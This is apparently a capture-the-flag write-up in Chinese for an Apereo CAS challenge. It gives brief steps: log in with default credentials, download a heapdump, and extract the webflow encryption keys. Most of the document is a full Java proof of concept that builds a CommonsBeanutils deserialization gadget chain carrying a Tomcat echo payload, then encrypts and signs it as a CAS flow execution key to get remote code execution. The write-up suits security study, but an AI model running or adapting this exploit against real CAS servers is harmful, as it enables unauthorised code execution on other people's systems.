---
tags: [Java反序列化, Heapdump分析, 信息泄露, Apereo CAS, CommonsBeanutils, RCE]
---

# easyCAS

后台账户

casuser Mellon

登陆然后下载heapdump

/login?service=[http%3A%2F%](http%3A%2F%)[2Fweb3.aliyunctf.com](http://2fweb3.aliyunctf.com/)%3A23465%2Fstatus%2Fheapdump查询key

select * from org.apereo.cas.util.cipher.WebflowConversationStateCipherExecutor

根据encode逻辑将payload加密，打cbnocc链即可

poc

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apereo.cas.util.EncodingUtils;
import org.apereo.spring.webflow.plugin.ClientFlowExecutionKey;
import org.jose4j.keys.AesKey;
import ysoserial.payloads.util.Gadgets;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.zip.GZIPOutputStream;

public class exploit {
public static void setFieldValue(Object obj, String fieldName, Object value) throws
Exception {
Field field = obj.getClass().getDeclaredField(fieldName);
field.setAccessible(true);
field.set(obj, value);
}

public static byte[] getpayload() throws Exception {

//TemplatesImpl obj = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");
TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][]
{ClassPool.getDefault().get("TomcatEchoPayload").toBytecode()});
setFieldValue(obj, "_name", "TomcatEchoPayload");
setFieldValue(obj, "_tfactory",
Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").ne
wInstance());

final BeanComparator comparator = new BeanComparator(null,
String.CASE_INSENSITIVE_ORDER);
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
// stub data for replacement later
queue.add("1");
queue.add("1");

setFieldValue(comparator, "property", "outputProperties");
setFieldValue(queue, "queue", new Object[]{obj, obj});

ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream(barr));
oos.writeObject(queue);
oos.close();

System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
return barr.toByteArray();
}

public static void main(String[] args) throws Exception {
ClientFlowExecutionKey clientFlowExecutionKey = new
ClientFlowExecutionKey(encode(getpayload()));
System.out.println(clientFlowExecutionKey);
}
public static byte[] encode(final byte[] value) throws NoSuchPaddingException,
NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException,
BadPaddingException {

String secretKeyAlgorithm = "AES";
byte[] encryptionSecretKey = new byte[]
{-24,-126,59,10,-121,29,3,80,-110,-8,-25,34,20,78,-43,94};
SecretKeySpec encryptionKey = new
SecretKeySpec(encryptionSecretKey,secretKeyAlgorithm);
byte[] signingSecretKey = "8MOjORWawdCo8TcXRIJPBA057q7ohmaqIB_5d6jbkcu9s-
YI5uRrl5JEN_vu03eptmFwUATepaiuZz5LvD-wIg".getBytes();//new byte[]{111, 50, 95, 102,
100, 114, 52, 88, 56, 101, 84, 111, 88, 115, 103, 52, 122, 82, 73, 76, 105, 81, 80, 88,
65, 78, 107, 78, 113, 76, 119, 106, 83, 99, 121, 77, 111, 99, 111, 100, 83, 56, 84, 86,
55, 80, 80, 68, 55, 95, 108, 85, 54, 51, 52, 73, 90, 86, 106, 84, 83, 111, 49, 88, 75,
120, 88, 75, 111, 70, 82, 85, 109, 120, 68, 108, 109, 99, 75, 103, 75, 116, 114, 102,
81, 103};
Key signingKey = new AesKey(signingSecretKey);
Cipher aesCipher = Cipher.getInstance("AES");
aesCipher.init(1, encryptionKey);
byte[] result = aesCipher.doFinal(value);
return "RSA".equalsIgnoreCase(signingKey.getAlgorithm()) ?
EncodingUtils.signJwsRSASha512(signingKey, result) :
EncodingUtils.signJwsHMACSha512(signingKey, result);

}
}
```

